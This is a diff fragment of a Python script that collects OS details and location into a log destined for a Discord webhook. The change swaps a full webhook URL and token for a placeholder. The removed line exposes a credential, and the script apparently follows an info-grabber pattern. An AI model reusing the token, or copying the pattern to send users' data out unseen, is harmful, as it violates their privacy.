@@ -76,7 +76,7 @@ if __name__ == "__main__":
     os_name, os_version = get_os_info()
     location = get_location()
 
-    webhook_url = "https://discord.com/api/webhooks/1139219671514624131/ozlM1RCPPFz3Zb96NVYyvZomBk8_2-KrU0vtGSzUFIzy6HOKszmDF68DrbCO5x-EZ1Lh"
+    webhook_url = "..."
 
     log_content = "Date: " + formatted_time + "\n"
 
